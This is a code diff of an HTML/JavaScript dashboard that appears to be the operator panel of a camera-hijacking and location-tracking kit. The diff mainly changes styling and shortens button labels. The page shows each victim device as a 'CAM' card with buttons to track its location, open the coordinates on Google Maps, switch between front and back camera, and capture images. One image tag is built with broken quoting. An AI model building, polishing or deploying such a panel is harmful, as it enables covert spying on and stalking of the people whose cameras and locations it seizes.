@@ -6,14 +6,14 @@
 <style>
 body { font-family: Arial; background: #121212; color: #fff; margin: 0; padding: 20px; }
 #login { position: fixed; top:0; left:0; width:100%; height:100%; background:#0a0a0a; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:100; }
-input, button { padding: 8px; margin: 4px; font-size: 14px; border-radius: 5px; border: none; }
+input, button { padding: 8px; margin: 4px; font-size: 13px; border-radius: 5px; border: none; }
 button { background: #00e676; font-weight: bold; cursor: pointer; }
-.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-top: 15px; }
-.card { background: #1a1a1a; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
-.head { background: #252525; padding: 8px; font-size: 11px; display: flex; justify-content: space-between; align-items: center; }
-.body img { width: 100%; height: 180px; object-fit: cover; background: #000; display: block; }
-.footer { padding: 8px; background: #1e1e1e; display: flex; gap: 5px; }
-.footer button { flex: 1; font-size: 12px; }
+.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-top: 15px; }
+.card { background: #1a1a1a; border: 1px solid #444; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; }
+.head { background: #252525; padding: 10px; font-size: 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
+.body img { width: 100%; height: 200px; object-fit: cover; background: #000; display: block; }
+.footer { padding: 10px; background: #1e1e1e; display: flex; gap: 6px; border-top: 1px solid #333; }
+.footer button { flex: 1; font-size: 11px; padding: 8px 4px; }
 .btn-cap { background: #ff1744; color: #fff; }
 .btn-sw { background: #ff9800; color: #fff; }
 .btn-loc { background: #2196f3; color: #fff; }
@@ -58,9 +58,9 @@ grid.innerHTML = '';
 keys.forEach((id, idx) => {
 const u = users[id];
 const dev = u.deviceInfo || 'Device';
-let locHtml = '<button class="btn-loc" onclick="requestLoc(\\'' + id + '\\')">?? Track Loc</button>';
+let locHtml = '<button class="btn-loc" onclick="requestLoc(\\'' + id + '\\')">?? Track</button>';
 if(u.location) {
-locHtml = '<a href="https://maps.google.com/?q=' + u.location.lat + ',' + u.location.lon + '" target="_blank" style="color:#00e676; font-weight:bold;">??? Open Map</a>';
+locHtml = '<a href="https://maps.google.com/?q=' + u.location.lat + ',' + u.location.lon + '" target="_blank" style="color:#00e676; font-weight:bold;">??? Map</a>';
 }
 grid.innerHTML += '<div class="card" id="c_' + id + '"><div class="head"><span>CAM ' + (idx+1) + ': ' + dev + '</span><span>' + locHtml + '</span></div><div class="body"><img id="img_' + id + ' src=`"></div><div class="footer"><button class="btn-sw" onclick="switchCam(\\'' + id + '\\', 'user')">Front</button><button class="btn-sw" onclick="switchCam(\\'' + id + '\\', 'environment')">Back</button><button class="btn-cap" onclick="capture(\\'' + id + '\\')">?? Capture</button></div></div>';
 });
